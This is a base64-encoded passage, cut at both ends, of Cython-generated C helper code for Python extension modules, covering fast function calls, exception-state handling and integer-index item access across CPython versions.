RShmdW5jLCAmUHlNZXRob2REZXNjcl9UeXBlKSkge1xuICAgICAgICByZXR1cm4gX1B5TWV0aG9kRGVzY3JfRmFzdENhbGxLZXl3b3JkcyhmdW5jLCBhcmdzLCBuYXJncywgTlVMTCk7XG4gICAgfVxuICAgICNlbmRpZlxuICAgICNpZiBDWVRIT05fRkFTVF9QWUNBTExcbiAgICBpZiAoUHlGdW5jdGlvbl9DaGVjayhmdW5jKSkge1xuICAgICAgICByZXR1cm4gX19QeXhfUHlGdW5jdGlvbl9GYXN0Q2FsbERpY3QoZnVuYywgYXJncywgbmFyZ3MsIGt3YXJncyk7XG4gICAgfVxuICAgICNlbmRpZlxuICAgICNlbmRpZlxuICAgIGlmIChrd2FyZ3MgPT0gTlVMTCkge1xuICAgICAgICAjaWYgQ1lUSE9OX1ZFQ1RPUkNBTEwgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAgICAgdmVjdG9yY2FsbGZ1bmMgZiA9IF9fUHl4X1B5VmVjdG9yY2FsbF9GdW5jdGlvbihmdW5jKTtcbiAgICAgICAgaWYgKGYpIHtcbiAgICAgICAgICAgIHJldHVybiBmKGZ1bmMsIGFyZ3MsIF9uYXJncywgTlVMTCk7XG4gICAgICAgIH1cbiAgICAgICAgI2VsaWYgZGVmaW5lZChfX1B5eF9DeUZ1bmN0aW9uX1VTRUQpICYmIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMXG4gICAgICAgIGlmIChfX1B5eF9DeUZ1bmN0aW9uX0NoZWNrRXhhY3QoZnVuYykpIHtcbiAgICAgICAgICAgIF9fcHl4X3ZlY3RvcmNhbGxmdW5jIGYgPSBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChmdW5jKTtcbiAgICAgICAgICAgIGlmIChmKSByZXR1cm4gZihmdW5jLCBhcmdzLCBfbmFyZ3MsIE5VTEwpO1xuICAgICAgICB9XG4gICAgICAgICNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgQ1lUSE9OX1ZFQ1RPUkNBTExcbiAgICAgICAgcmV0dXJuIFB5T2JqZWN0X1ZlY3RvcmNhbGwoZnVuYywgYXJncywgX25hcmdzLCBOVUxMKTtcbiAgICAgICAgI2VuZGlmXG4gICAgfVxuICAgIGlmIChuYXJncyA9PSAwKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9DYWxsKGZ1bmMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLCBrd2FyZ3MpO1xuICAgIH1cbiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIHJldHVybiBQeU9iamVjdF9WZWN0b3JjYWxsRGljdChmdW5jLCBhcmdzLCAoc2l6ZV90KW5hcmdzLCBrd2FyZ3MpO1xuICAgICNlbHNlXG4gICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsX2ZhbGxiYWNrKGZ1bmMsIGFyZ3MsIChzaXplX3QpbmFyZ3MsIGt3YXJncyk7XG4gICAgI2VuZGlmXG59XG5cblxuI2lmICFDWVRIT05fVkVDVE9SQ0FMTCB8fCBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDBcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZikge1xuICAgIFB5T2JqZWN0ICpyZXN1bHQ7XG4gICAgUHlPYmplY3QgKmF0dHIgPSBQeU9iamVjdF9HZXRBdHRyKGFyZ3NbMF0sIG5hbWUpO1xuICAgIGlmICh1bmxpa2VseSghYXR0cikpXG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIHJlc3VsdCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKGF0dHIsIGFyZ3MrMSwgbmFyZ3NmIC0gMSk7XG4gICAgUHlfREVDUkVGKGF0dHIpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG4jZW5kaWZcblxuXG5zdGF0aWMgdm9pZCBfX1B5eF9SYWlzZVVuYm91bmRMb2NhbEVycm9yKGNvbnN0IGNoYXIgKnZhcm5hbWUpIHtcbiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVW5ib3VuZExvY2FsRXJyb3IsICJsb2NhbCB2YXJpYWJsZSBcJyVzXCcgcmVmZXJlbmNlZCBiZWZvcmUgYXNzaWdubWVudCIsIHZhcm5hbWUpO1xufVxuXG5cbiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbnN0YXRpYyBpbnQgX19QeXhfX0dldEV4Y2VwdGlvbihQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0YilcbiNlbHNlXG5zdGF0aWMgaW50IF9fUHl4X0dldEV4Y2VwdGlvbihQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpXG4jZW5kaWZcbntcbiAgICBQeU9iamVjdCAqbG9jYWxfdHlwZSA9IE5VTEwsICpsb2NhbF92YWx1ZSwgKmxvY2FsX3RiID0gTlVMTDtcbiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiAgICBQeU9iamVjdCAqdG1wX3R5cGUsICp0bXBfdmFsdWUsICp0bXBfdGI7XG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwXG4gICAgbG9jYWxfdmFsdWUgPSB0c3RhdGUtPmN1cnJlbnRfZXhjZXB0aW9uO1xuICAgIHRzdGF0ZS0+Y3VycmVudF9leGNlcHRpb24gPSAwO1xuICAjZWxzZVxuICAgIGxvY2FsX3R5cGUgPSB0c3RhdGUtPmN1cmV4Y190eXBlO1xuICAgIGxvY2FsX3ZhbHVlID0gdHN0YXRlLT5jdXJleGNfdmFsdWU7XG4gICAgbG9jYWxfdGIgPSB0c3RhdGUtPmN1cmV4Y190cmFjZWJhY2s7XG4gICAgdHN0YXRlLT5jdXJleGNfdHlwZSA9IDA7XG4gICAgdHN0YXRlLT5jdXJleGNfdmFsdWUgPSAwO1xuICAgIHRzdGF0ZS0+Y3VyZXhjX3RyYWNlYmFjayA9IDA7XG4gICNlbmRpZlxuI2VsaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+IDB4MDMwQzAwMDBcbiAgICBsb2NhbF92YWx1ZSA9IFB5RXJyX0dldFJhaXNlZEV4Y2VwdGlvbigpO1xuI2Vsc2VcbiAgICBQeUVycl9GZXRjaCgmbG9jYWxfdHlwZSwgJmxvY2FsX3ZhbHVlLCAmbG9jYWxfdGIpO1xuI2VuZGlmXG4jaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+IDB4MDMwQzAwMDBcbiAgICBpZiAobGlrZWx5KGxvY2FsX3ZhbHVlKSkge1xuICAgICAgICBsb2NhbF90eXBlID0gKFB5T2JqZWN0KikgUHlfVFlQRShsb2NhbF92YWx1ZSk7XG4gICAgICAgIFB5X0lOQ1JFRihsb2NhbF90eXBlKTtcbiAgICAgICAgbG9jYWxfdGIgPSBQeUV4Y2VwdGlvbl9HZXRUcmFjZWJhY2sobG9jYWxfdmFsdWUpO1xuICAgIH1cbiNlbHNlXG4gICAgUHlFcnJfTm9ybWFsaXplRXhjZXB0aW9uKCZsb2NhbF90eXBlLCAmbG9jYWxfdmFsdWUsICZsb2NhbF90Yik7XG4jaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4gICAgaWYgKHVubGlrZWx5KHRzdGF0ZS0+Y3VyZXhjX3R5cGUpKVxuI2Vsc2VcbiAgICBpZiAodW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpXG4jZW5kaWZcbiAgICAgICAgZ290byBiYWQ7XG4gICAgaWYgKGxvY2FsX3RiKSB7XG4gICAgICAgIGlmICh1bmxpa2VseShQeUV4Y2VwdGlvbl9TZXRUcmFjZWJhY2sobG9jYWxfdmFsdWUsIGxvY2FsX3RiKSA8IDApKVxuICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgfVxuI2VuZGlmIC8vIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPiAweDAzMEMwMDAwXG4gICAgUHlfWElOQ1JFRihsb2NhbF90Yik7XG4gICAgUHlfWElOQ1JFRihsb2NhbF90eXBlKTtcbiAgICBQeV9YSU5DUkVGKGxvY2FsX3ZhbHVlKTtcbiAgICAqdHlwZSA9IGxvY2FsX3R5cGU7XG4gICAgKnZhbHVlID0gbG9jYWxfdmFsdWU7XG4gICAgKnRiID0gbG9jYWxfdGI7XG4jaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4gICAgI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0tcbiAgICB7XG4gICAgICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gdHN0YXRlLT5leGNfaW5mbztcbiAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0XG4gICAgICAgIHRtcF92YWx1ZSA9IGV4Y19pbmZvLT5leGNfdmFsdWU7XG4gICAgICAgIGV4Y19pbmZvLT5leGNfdmFsdWUgPSBsb2NhbF92YWx1ZTtcbiAgICAgICAgdG1wX3R5cGUgPSBOVUxMO1xuICAgICAgICB0bXBfdGIgPSBOVUxMO1xuICAgICAgICBQeV9YREVDUkVGKGxvY2FsX3R5cGUpO1xuICAgICAgICBQeV9YREVDUkVGKGxvY2FsX3RiKTtcbiAgICAgICNlbHNlXG4gICAgICAgIHRtcF90eXBlID0gZXhjX2luZm8tPmV4Y190eXBlO1xuICAgICAgICB0bXBfdmFsdWUgPSBleGNfaW5mby0+ZXhjX3ZhbHVlO1xuICAgICAgICB0bXBfdGIgPSBleGNfaW5mby0+ZXhjX3RyYWNlYmFjaztcbiAgICAgICAgZXhjX2luZm8tPmV4Y190eXBlID0gbG9jYWxfdHlwZTtcbiAgICAgICAgZXhjX2luZm8tPmV4Y192YWx1ZSA9IGxvY2FsX3ZhbHVlO1xuICAgICAgICBleGNfaW5mby0+ZXhjX3RyYWNlYmFjayA9IGxvY2FsX3RiO1xuICAgICAgI2VuZGlmXG4gICAgfVxuICAgICNlbHNlXG4gICAgdG1wX3R5cGUgPSB0c3RhdGUtPmV4Y190eXBlO1xuICAgIHRtcF92YWx1ZSA9IHRzdGF0ZS0+ZXhjX3ZhbHVlO1xuICAgIHRtcF90YiA9IHRzdGF0ZS0+ZXhjX3RyYWNlYmFjaztcbiAgICB0c3RhdGUtPmV4Y190eXBlID0gbG9jYWxfdHlwZTtcbiAgICB0c3RhdGUtPmV4Y192YWx1ZSA9IGxvY2FsX3ZhbHVlO1xuICAgIHRzdGF0ZS0+ZXhjX3RyYWNlYmFjayA9IGxvY2FsX3RiO1xuICAgICNlbmRpZlxuICAgIFB5X1hERUNSRUYodG1wX3R5cGUpO1xuICAgIFB5X1hERUNSRUYodG1wX3ZhbHVlKTtcbiAgICBQeV9YREVDUkVGKHRtcF90Yik7XG4jZWxpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwYjAwMDBcbiAgICBQeUVycl9TZXRIYW5kbGVkRXhjZXB0aW9uKGxvY2FsX3ZhbHVlKTtcbiAgICBQeV9YREVDUkVGKGxvY2FsX3ZhbHVlKTtcbiAgICBQeV9YREVDUkVGKGxvY2FsX3R5cGUpO1xuICAgIFB5X1hERUNSRUYobG9jYWxfdGIpO1xuI2Vsc2VcbiAgICBQeUVycl9TZXRFeGNJbmZvKGxvY2FsX3R5cGUsIGxvY2FsX3ZhbHVlLCBsb2NhbF90Yik7XG4jZW5kaWZcbiAgICByZXR1cm4gMDtcbiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDw9IDB4MDMwQzAwMDBcbmJhZDpcbiAgICAqdHlwZSA9IDA7XG4gICAgKnZhbHVlID0gMDtcbiAgICAqdGIgPSAwO1xuICAgIFB5X1hERUNSRUYobG9jYWxfdHlwZSk7XG4gICAgUHlfWERFQ1JFRihsb2NhbF92YWx1ZSk7XG4gICAgUHlfWERFQ1JFRihsb2NhbF90Yik7XG4gICAgcmV0dXJuIC0xO1xuI2VuZGlmXG59XG5cblxuc3RhdGljIHZvaWQgX19QeXhfR2VuZXJhdG9yX1JlcGxhY2VfU3RvcEl0ZXJhdGlvbihpbnQgaW5fYXN5bmNfZ2VuKSB7XG4gICAgUHlPYmplY3QgKmV4YywgKnZhbCwgKnRiLCAqY3VyX2V4YywgKm5ld19leGM7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgaW50IGlzX2FzeW5jX3N0b3BpdGVyYXRpb24gPSAwO1xuICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKGluX2FzeW5jX2dlbik7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICBjdXJfZXhjID0gX19QeXhfUHlFcnJfQ3VycmVudEV4Y2VwdGlvblR5cGUoKTtcbiAgICBpZiAobGlrZWx5KCFfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoY3VyX2V4YywgUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSB7XG4gICAgICAgIGlmIChpbl9hc3luY19nZW4gJiYgdW5saWtlbHkoX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGN1cl9leGMsIFB5RXhjX1N0b3BBc3luY0l0ZXJhdGlvbikpKSB7XG4gICAgICAgICAgICBpc19hc3luY19zdG9waXRlcmF0aW9uID0gMTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIHJldHVybjtcbiAgICAgICAgfVxuICAgIH1cbiAgICBfX1B5eF9HZXRFeGNlcHRpb24oJmV4YywgJnZhbCwgJnRiKTtcbiAgICBQeV9YREVDUkVGKGV4Yyk7XG4gICAgUHlfWERFQ1JFRih0Yik7XG4gICAgbmV3X2V4YyA9IFB5T2JqZWN0X0NhbGxGdW5jdGlvbihQeUV4Y19SdW50aW1lRXJyb3IsICJzIixcbiAgICAgICAgaXNfYXN5bmNfc3RvcGl0ZXJhdGlvbiA/ICJhc3luYyBnZW5lcmF0b3IgcmFpc2VkIFN0b3BBc3luY0l0ZXJhdGlvbiIgOlxuICAgICAgICBpbl9hc3luY19nZW4gPyAiYXN5bmMgZ2VuZXJhdG9yIHJhaXNlZCBTdG9wSXRlcmF0aW9uIiA6XG4gICAgICAgICJnZW5lcmF0b3IgcmFpc2VkIFN0b3BJdGVyYXRpb24iKTtcbiAgICBpZiAoIW5ld19leGMpIHtcbiAgICAgICAgUHlfWERFQ1JFRih2YWwpO1xuICAgICAgICByZXR1cm47XG4gICAgfVxuICAgIFB5RXhjZXB0aW9uX1NldENhdXNlKG5ld19leGMsIHZhbCk7IC8vIHN0ZWFscyByZWYgdG8gdmFsXG4gICAgUHlFcnJfU2V0T2JqZWN0KFB5RXhjX1J1bnRpbWVFcnJvciwgbmV3X2V4Yyk7XG59XG5cblxuI2lmIENZVEhPTl9WRUNUT1JDQUxMXG5zdGF0aWMgaW50IF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhQeU9iamVjdCAqa2V5LCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICpidWlsZGVyLCBQeU9iamVjdCAqKmFyZ3MsIGludCBuKSB7XG4gICAgKHZvaWQpX19QeXhfUHlPYmplY3RfRmFzdENhbGxEaWN0O1xuICAgIGlmIChfX1B5eF9QeVR1cGxlX1NFVF9JVEVNKGJ1aWxkZXIsIG4sIGtleSkgIT0gKDApKSByZXR1cm4gLTE7XG4gICAgUHlfSU5DUkVGKGtleSk7XG4gICAgYXJnc1tuXSA9IHZhbHVlO1xuICAgIHJldHVybiAwO1xufVxuQ1lUSE9OX1VOVVNFRCBzdGF0aWMgaW50IF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZ19DaGVjayhQeU9iamVjdCAqa2V5LCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICpidWlsZGVyLCBQeU9iamVjdCAqKmFyZ3MsIGludCBuKSB7XG4gICAgKHZvaWQpX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnU3RyO1xuICAgIGlmICh1bmxpa2VseSghUHlVbmljb2RlX0NoZWNrKGtleSkpKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsICJrZXl3b3JkcyBtdXN0IGJlIHN0cmluZ3MiKTtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICByZXR1cm4gX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKGtleSwgdmFsdWUsIGJ1aWxkZXIsIGFyZ3MsIG4pO1xufVxuc3RhdGljIGludCBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmdTdHIoY29uc3QgY2hhciAqa2V5LCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICpidWlsZGVyLCBQeU9iamVjdCAqKmFyZ3MsIGludCBuKSB7XG4gICAgUHlPYmplY3QgKnB5S2V5ID0gUHlVbmljb2RlX0Zyb21TdHJpbmcoa2V5KTtcbiAgICBpZiAoIXB5S2V5KSByZXR1cm4gLTE7XG4gICAgcmV0dXJuIF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhweUtleSwgdmFsdWUsIGJ1aWxkZXIsIGFyZ3MsIG4pO1xufVxuI2Vsc2UgLy8gQ1lUSE9OX1ZFQ1RPUkNBTExcbkNZVEhPTl9VTlVTRUQgc3RhdGljIGludCBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmdfQ2hlY2soUHlPYmplY3QgKmtleSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqYnVpbGRlciwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqKmFyZ3MsIENZVEhPTl9VTlVTRUQgaW50IG4pIHtcbiAgICBpZiAodW5saWtlbHkoIVB5VW5pY29kZV9DaGVjayhrZXkpKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLCAia2V5d29yZHMgbXVzdCBiZSBzdHJpbmdzIik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgcmV0dXJuIFB5RGljdF9TZXRJdGVtKGJ1aWxkZXIsIGtleSwgdmFsdWUpO1xufVxuI2VuZGlmXG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5VW5pY29kZV9Vbmljb2RlKFB5T2JqZWN0ICpvYmopIHtcbiAgICBpZiAodW5saWtlbHkob2JqID09IFB5X05vbmUpKVxuICAgICAgICBvYmogPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X05vbmU7XG4gICAgcmV0dXJuIF9fUHl4X05ld1JlZihvYmopO1xufVxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2V0SXRlbUludF9HZW5lcmljKFB5T2JqZWN0ICpvLCBQeU9iamVjdCogaikge1xuICAgIFB5T2JqZWN0ICpyO1xuICAgIGlmICh1bmxpa2VseSghaikpIHJldHVybiBOVUxMO1xuICAgIHIgPSBQeU9iamVjdF9HZXRJdGVtKG8sIGopO1xuICAgIFB5X0RFQ1JFRihqKTtcbiAgICByZXR1cm4gcjtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9HZXRJdGVtSW50X0xpc3RfRmFzdChQeU9iamVjdCAqbywgUHlfc3NpemVfdCBpLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDWVRIT05fTkNQX1VOVVNFRCBpbnQgd3JhcGFyb3VuZCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ1lUSE9OX05DUF9VTlVTRUQgaW50IGJvdW5kc2NoZWNrKSB7XG4jaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgJiYgIUNZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlNcbiAgICBQeV9zc2l6ZV90IHdyYXBwZWRfaSA9IGk7XG4gICAgaWYgKHdyYXBhcm91bmQgJiB1bmxpa2VseShpIDwgMCkpIHtcbiAgICAgICAgd3JhcHBlZF9pICs9IFB5TGlzdF9HRVRfU0laRShvKTtcbiAgICB9XG4gICAgaWYgKCghYm91bmRzY2hlY2spIHx8IGxpa2VseShfX1B5eF9pc192YWxpZF9pbmRleCh3cmFwcGVkX2ksIFB5TGlzdF9HRVRfU0laRShvKSkpKSB7XG4gICAgICAgIFB5T2JqZWN0ICpyID0gUHlMaXN0X0dFVF9JVEVNKG8sIHdyYXBwZWRfaSk7XG4gICAgICAgIFB5X0lOQ1JFRihyKTtcbiAgICAgICAgcmV0dXJuIHI7XG4gICAgfVxuICAgIHJldHVybiBfX1B5eF9HZXRJdGVtSW50X0dlbmVyaWMobywgUHlMb25nX0Zyb21Tc2l6ZV90KGkpKTtcbiNlbHNlXG4gICAgcmV0dXJuIFB5U2VxdWVuY2VfR2V0SXRlbShvLCBpKTtcbiNlbmRpZlxufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0dldEl0ZW1JbnRfVHVwbGVfRmFzdChQeU9iamVjdCAqbywgUHlfc3NpemVfdCBpLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDWVRIT05fTkNQX1VOVVNFRCBpbnQgd3JhcGFyb3VuZCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ1lUSE9OX05DUF9VTlVTRUQgaW50IGJvdW5kc2NoZWNrKSB7XG4jaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICBQeV9zc2l6ZV90IHdyYXBwZWRfaSA9IGk7XG4gICAgaWYgKHdyYXBhcm91bmQgJiB1bmxpa2VseShpIDwgMCkpIHtcbiAgICAgICAgd3JhcHBlZF9pICs9IFB5VHVwbGVfR0VUX1NJWkUobyk7XG4gICAgfVxuICAgIGlmICgoIWJvdW5kc2NoZWNrKSB8fCBsaWtlbHkoX19QeXhfaXNfdmFsaWRfaW5kZXgod3JhcHBlZF9pLCBQeVR1cGxlX0dFVF9TSVpFKG8pKSkpIHtcbiAgICAgICAgUHlPYmplY3QgKnIgPSBQeVR1cGxlX0dFVF9JVEVNKG8sIHdyYXBwZWRfaSk7XG4gICAgICAgIFB5X0lOQ1JFRihyKTtcbiAgICAgICAgcmV0dXJuIHI7XG4gICAgfVxuICAgIHJldHVybiBfX1B5eF9HZXRJdGVtSW50X0dlbmVyaWMobywgUHlMb25nX0Zyb21Tc2l6ZV90KGkpKTtcbiNlbHNlXG4gICAgcmV0dXJuIFB5U2VxdWVuY2VfR2V0SXRlbShvLCBpKTtcbiNlbmRpZlxufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0dldEl0ZW1JbnRfRmFzdChQeU9iamVjdCAqbywgUHlfc3NpemVfdCBpLCBpbnQgaXNfbGlzdCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ1lUSE9OX05DUF9VTlVTRUQgaW50IHdyYXBhcm91bmQsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENZVEhPTl9OQ1BfVU5VU0VEIGludCBib3VuZHNjaGVjaykge1xuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTICYmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAgIGlmIChpc19saXN0IHx8IFB5TGlzdF9DaGVja0V4YWN0KG8pKSB7XG4gICAgICAgIFB5X3NzaXplX3QgbiA9ICgoIXdyYXBhcm91bmQpIHwgbGlrZWx5KGkgPj0gMCkpID8gaSA6IGkgKyBQeUxpc3RfR0VUX1NJWkUobyk7XG4gICAgICAgIGlmICgoIWJvdW5kc2NoZWNrKSB8fCAobGlrZWx5KF9fUHl4X2lzX3ZhbGlkX2luZGV4KG4sIFB5TGlzdF9HRVRfU0laRShvKSkpKSkge1xuICAgICAgICAgICAgcmV0dXJuIF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKG8sIG4pO1xuICAgICAgICB9XG4gICAgfVxuICAgIGVsc2UgaWYgKFB5VHVwbGVfQ2hlY2tFeGFjdChvKSkge1xuICAgICAgICBQeV9zc2l6ZV90IG4gPSAoKCF3cmFwYXJvdW5kKSB8IGxpa2VseShpID49IDApKSA/IGkgOiBpICsgUHlUdXBsZV9HRVRfU0laRShvKTtcbiAgICAgICAgaWYgKCghYm91bmRzY2hlY2spIHx8IGxpa2VseShfX1B5eF9pc192YWxpZF9pbmRleChuLCBQeVR1cGxlX0dFVF9TSVpFKG8pKSkpIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpyID0gUHlUdXBsZV9HRVRfSVRFTShvLCBuKTtcbiAgICAgICAgICAgIFB5X0lOQ1JFRihyKTtcbiAgICAgICAgICAgIHJldHVybiByO1xuICAgICAgICB9XG4gICAgfSBlbHNlIHtcbiAgICAgICAgUHlNYXBwaW5nTWV0aG9kcyAqbW0gPSBQeV9UWVBFKG8pLT50cF9hc19tYXBwaW5nO1xuICAgICAgICBQeVNlcXVlbmNlTWV0aG9kcyAqc20gPSBQeV9UWVBFKG8pLT50cF9hc19zZXF1ZW5jZTtcbiAgICAgICAgaWYgKG1tICYmIG1tLT5tcF9zdWJzY3JpcHQpIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpyLCAqa2V5ID0gUHlMb25nX0Zyb21Tc2l6ZV90KGkpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFrZXkpKSByZXR1cm4gTlVMTDtcbiAgICAgICAgICAgIHIgPSBtbS0+bXBfc3Vic2NyaXB0KG8sIGtleSk7XG4gICAgICAgICAgICBQeV9ERUNSRUYoa2V5KTtcbiAgICAgICAgICAgIHJldHVybiByO1xuICAgICAgICB9XG4gICAgICAgIGlmIChsaWtlbHkoc20gJiYgc20tPnNxX2l0ZW0pKSB7XG4gICAgICAgICAgICBpZiAod3JhcGFyb3VuZCAmJiB1bmxpa2VseShpIDwgMCkgJiYgbGlrZWx5KHNtLT5zcV9sZW5ndGgpKSB7XG4gICAgICAgICAgICAgICAgUHlfc3NpemVfdCBsID0gc20tPnNxX2xlbmd0aChvKTtcbiAgICAgICAgICAgICAgICBpZiAobGlrZWx5KGwgPj0gMCkpIHtcbiAgICAgICAgICAgICAgICAgICAgaSArPSBsO1xuICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgIGlmICghUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhQeUV4Y19PdmVyZmxvd0Vycm9yKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICAgICAgICAgICAgICBQeUVycl9DbGVhcigpO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIHJldHVybiBzbS0+c3FfaXRlbShvLCBpKTtcbiAgICAgICAgfVxuICAgIH1cbiNlbHNlXG4gICAgaWYgKGlzX2xpc3QgfHwgIVB5TWFwcGluZ19DaGVjayhvKSkge1xuICAgICAgICByZXR1cm4gUHlTZXF1ZW5jZV9HZXRJdGVtKG8sIGkpO1xuICAgIH1cbiNlbmRpZlxuICAgIHJldHVybiBfX1B5eF9HZXRJdGVtSW50X0dlbmVyaWMobywgUHlMb25nX0Zyb21Tc2l6ZV90KGkpKTtcbn1cblxuXG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeURpY3RfR2V0SXRlbShQeU9iamVjdCAqZCwgUHlPYmplY3QqIGtleSkge1xuICAgIFB5T2JqZWN0ICp2YWx1ZTtcbiAgICBpZiAodW5saWtlbHkoX19QeXhfUHlEaWN0X0dldEl0ZW1SZWYoZCwga2V5LCAmdmFsdWUpID09IDApKSB7IC8vIG5vIHZhbHVlLCBubyBlcnJvclxuICAgICAgICBpZiAodW5saWtlbHkoUHlUdXBsZV9DaGVjayhrZXkpKSkge1xuICAgICAgICAgICAgUHlPYmplY3QqIGFyZ3MgPSBQeVR1cGxlX1BhY2soMSwga2